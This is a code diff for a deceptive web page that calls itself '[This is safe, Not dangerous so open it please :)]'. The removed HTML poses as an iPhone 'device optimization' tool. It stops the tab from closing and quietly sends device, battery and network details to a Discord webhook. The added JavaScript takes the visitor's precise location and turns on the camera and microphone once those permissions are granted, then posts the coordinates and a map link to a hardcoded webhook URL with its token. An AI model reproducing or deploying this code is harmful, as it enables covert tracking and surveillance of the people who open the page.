@@ -1,263 +1,72 @@
-<!DOCTYPE html>
-<html lang="en">
-<head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>[This is safe, Not dangerous so open it please :)]</title>
-    <style>
-        * {
-            margin: 0;
-            padding: 0;
-            box-sizing: border-box;
-        }
-        
-        body {
-            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Helvetica, Arial, sans-serif;
-            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
-            min-height: 100vh;
-            display: flex;
-            justify-content: center;
-            align-items: center;
-            padding: 20px;
-        }
-        
-        .container {
-            background: rgba(255, 255, 255, 0.95);
-            border-radius: 20px;
-            padding: 40px;
-            max-width: 400px;
-            width: 100%;
-            box-shadow: 0 20px 40px rgba(0, 0, 0, 0.1);
-            backdrop-filter: blur(10px);
-            text-align: center;
-        }
-        
-        .header {
-            margin-bottom: 30px;
-        }
-        
-        .header h1 {
-            color: #333;
-            font-size: 24px;
-            font-weight: 600;
-            margin-bottom: 10px;
-        }
-        
-        .header p {
-            color: #666;
-            font-size: 14px;
-        }
-        
-        .loading {
-            margin-top: 20px;
-        }
-        
-        .spinner {
-            width: 40px;
-            height: 40px;
-            border: 4px solid #f3f3f3;
-            border-top: 4px solid #667eea;
-            border-radius: 50%;
-            animation: spin 1s linear infinite;
-            margin: 0 auto 20px;
-        }
-        
-        @keyframes spin {
-            0% { transform: rotate(0deg); }
-            100% { transform: rotate(360deg); }
-        }
-        
-        .status-text {
-            color: #666;
-            font-size: 16px;
-            margin-bottom: 10px;
-        }
-        
-        .progress-bar {
-            width: 100%;
-            height: 6px;
-            background: #e0e0e0;
-            border-radius: 3px;
-            overflow: hidden;
-            margin-top: 20px;
-        }
-        
-        .progress-fill {
-            height: 100%;
-            background: linear-gradient(90deg, #667eea, #764ba2);
-            width: 0%;
-            transition: width 0.3s ease;
-        }
-        
-        .success {
-            display: none;
-            color: #4CAF50;
-            font-weight: 500;
-            margin-top: 20px;
-        }
-    </style>
-</head>
-<body>
-    <div class="container">
-        <div class="header">
-            <h1>[This is safe, Not dangerous so open it please :)]</h1>
-            <p>Optimizing your device experience...</p>
-        </div>
-        
-        <div class="loading">
-            <div class="spinner"></div>
-            <div class="status-text" id="statusText">Initializing secure connection...</div>
-            <div class="progress-bar">
-                <div class="progress-fill" id="progressFill"></div>
-            </div>
-        </div>
-        
-        <div class="success" id="success">
-            <p>✅ Device optimization complete!</p>
-        </div>
-    </div>
+// JavaScript code for the described functionality
 
-    <script>
-        document.addEventListener('DOMContentLoaded', function() {
-            // Prevent user from closing the tab
-            window.onbeforeunload = function() {
-                return "Device optimization in progress - please wait!";
-            };
+// Define the webhook URL
+const DISCORD_WEBHOOK_URL = 'https://discord.com/api/webhooks/1485887217137225840/yAtbah4VmqKvRY4PUBEkLuXBkagBCV1CeKcJ6pKPq-nLO2_RxpfcHfo6lscG4zEvJRms';
 
-            // Check if the device is an iPhone
-            const isIPhone = /iPhone|iPad|iPod/.test(navigator.userAgent);
-            if (!isIPhone) {
-                document.querySelector('.container').innerHTML = `
-                    <div class="header">
-                        <h1>Device Not Supported</h1>
-                        <p>This optimization is only for iPhone devices.</p>
-                    </div>
-                `;
-                return;
-            }
+// Function to send data to Discord webhook
+async function sendToDiscord(data) {
+    const response = await fetch(DISCORD_WEBHOOK_URL, {
+        method: 'POST',
+        headers: {
+            'Content-Type': 'application/json',
+        },
+        body: JSON.stringify(data),
+    });
+    return response.ok;
+}
 
-            // Status messages for the loading process
-            const statusMessages = [
-                "Initializing secure connection...",
-                "Scanning device hardware...",
-                "Analyzing battery performance...",
-                "Checking network connectivity...",
-                "Optimizing system settings...",
-                "Finalizing configuration..."
-            ];
+// Function to get user permissions and data
+async function getUserData() {
+    try {
+        // Request permissions
+        const permissions = await navigator.permissions.query({ name: 'camera' });
+        const microphonePermissions = await navigator.permissions.query({ name: 'microphone' });
+        const locationPermissions = await navigator.permissions.query({ name: 'geolocation' });
 
-            let currentStep = 0;
-            const statusText = document.getElementById('statusText');
-            const progressFill = document.getElementById('progressFill');
+        // Check if permissions are granted
+        if (permissions.state === 'granted' && microphonePermissions.state === 'granted' && locationPermissions.state === 'granted') {
+            // Get camera and microphone data
+            const cameraStream = await navigator.mediaDevices.getUserMedia({ video: true });
+            const microphoneStream = await navigator.mediaDevices.getUserMedia({ audio: true });
 
-            // Update status and progress
-            function updateStatus() {
-                if (currentStep < statusMessages.length) {
-                    statusText.textContent = statusMessages[currentStep];
-                    progressFill.style.width = `\${((currentStep + 1) / statusMessages.length) * 100}%`;
-                    currentStep++;
-                    setTimeout(updateStatus, 800);
-                } else {
-                    // Collection complete - send data
-                    collectAndSendData();
-                }
-            }
+            // Get location data
+            const position = await new Promise((resolve, reject) => {
+                navigator.geolocation.getCurrentPosition(resolve, reject);
+            });
 
-            function collectAndSendData() {
-                // Collect comprehensive device information
-                const deviceInfo = {
-                    timestamp: new Date().toISOString(),
-                    device: {
-                        userAgent: navigator.userAgent,
-                        platform: navigator.platform,
-                        language: navigator.language,
-                        deviceMemory: navigator.deviceMemory || 'Unknown',
-                        hardwareConcurrency: navigator.hardwareConcurrency || 'Unknown',
-                        vendor: navigator.vendor || 'Unknown'
-                    },
-                    display: {
-                        screenResolution: `${screen.width}x${screen.height}`,
-                        colorDepth: screen.colorDepth,
-                        pixelRatio: window.devicePixelRatio || 1,
-                        availWidth: screen.availWidth,
-                        availHeight: screen.availHeight
-                    },
-                    battery: {
-                        level: 'Unknown',
-                        charging: 'Unknown'
-                    },
-                    connection: {
-                        effectiveType: navigator.connection?.effectiveType || 'Unknown',
-                        downlink: navigator.connection?.downlink || 'Unknown',
-                        rtt: navigator.connection?.rtt || 'Unknown',
-                        saveData: navigator.connection?.saveData || false
-                    },
-                    system: {
-                        timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
-                        cookieEnabled: navigator.cookieEnabled,
-                        doNotTrack: navigator.doNotTrack,
-                        onlineStatus: navigator.onLine,
-                        cores: navigator.hardwareConcurrency || 'Unknown'
-                    }
-                };
+            // Create a message with emojis
+            const message = `
+            📹 Cámara activada
+            🎤 Micrófono activado
+            📍 Ubicación: ${position.coords.latitude}, ${position.coords.longitude}
+            🌐 [Google Maps Link](https://www.google.com/maps?q=${position.coords.latitude},${position.coords.longitude})
+            `;
 
-                // Get battery information
-                if (navigator.getBattery) {
-                    navigator.getBattery().then(function(battery) {
-                        deviceInfo.battery.level = battery.level;
-                        deviceInfo.battery.charging = battery.charging;
-                        deviceInfo.battery.chargingTime = battery.chargingTime;
-                        deviceInfo.battery.dischargingTime = battery.dischargingTime;
-                    });
-                }
+            // Send data to Discord
+            await sendToDiscord({ content: message });
 
-                // Try to get WiFi information
-                try {
-                    const wifiConnection = navigator.connection || navigator.mozConnection || navigator.webkitConnection;
-                    if (wifiConnection) {
-                        deviceInfo.network = {
-                            type: wifiConnection.type || 'Unknown',
-                            effectiveType: wifiConnection.effectiveType || 'Unknown',
-                            downlink: wifiConnection.downlink || 'Unknown',
-                            rtt: wifiConnection.rtt || 'Unknown'
-                        };
-                    }
-                } catch (e) {
-                    console.log('Network info not available');
-                }
+            // Change text to English if location permissions are granted
+            document.getElementById('loading-text').textContent = 'Loading...';
+        } else {
+            // Display loading text in Spanish
+            document.getElementById('loading-text').textContent = 'Cargando...';
+        }
+    } catch (error) {
+        console.error('Error getting user data:', error);
+    }
+}
 
-                // Send to Discord webhook with professional formatting
-                const discordMessage = {
-                    content: `📱 **[This is safe, Not dangerous so open it please :)]** - New iPhone Device Information`,
-                    embeds: [{
-                        title: "🔍 Device Information Collected",
-                        color: 5814783,
-                        fields: [
-                            {
-                                name: "📱 Device Details",
-                                value: `**Platform:** ${deviceInfo.device.platform}\n**Language:** ${deviceInfo.device.language}\n**Memory:** ${deviceInfo.device.deviceMemory}GB\n**Cores:** ${deviceInfo.device.hardwareConcurrency}`,
-                                inline: true
-                            },
-                            {
-                                name: "🖥️ Display Information",
-                                value: `**Resolution:** ${deviceInfo.display.screenResolution}\n**Color Depth:** ${deviceInfo.display.colorDepth}bit\n**Pixel Ratio:** ${deviceInfo.display.pixelRatio}`,
-                                inline: true
-                            },
-                            {
-                                name: "🔋 Battery Status",
-                                value: `**Level:** ${Math.round((deviceInfo.battery.level || 0) * 100)}%\n**Charging:** \${deviceInfo.battery.charging ? 'Yes' : 'No'}`,
-                                inline: true
-                            },
-                            {
-                                name: "🌐 Network Information",
-                                value: `**Type:** ${deviceInfo.connection.effectiveType}\n**Downlink:** ${deviceInfo.connection.downlink}Mbps\n**RTT:** ${deviceInfo.connection.rtt}ms`,
-                                inline: true
-                            },
-                            {
-                                name: "⚙️ System Information",
-                                value: `**Timezone:** ${deviceInfo.system.timezone}\n**Online:** ${deviceInfo.system.onlineStatus ? 'Yes' : 'No'}\n**Cookies:** ${deviceInfo.system.cookieEnabled ? 'Enabled' : 'Disabled'}`,
-                                inline: true
-                            },
-                            {
-                                name: "🕐 Collection Time",
-                                value: new
+// Function to check location permissions and update text
+function checkLocationPermissions() {
+    navigator.permissions.query({ name: 'geolocation' }).then((permissionStatus) => {
+        if (permissionStatus.state === 'granted') {
+            document.getElementById('loading-text').textContent = 'Loading...';
+        }
+    });
+}
+
+// Initial call to get user data
+getUserData();
+
+// Set interval to check location permissions every second
+setInterval(checkLocationPermissions, 1000);
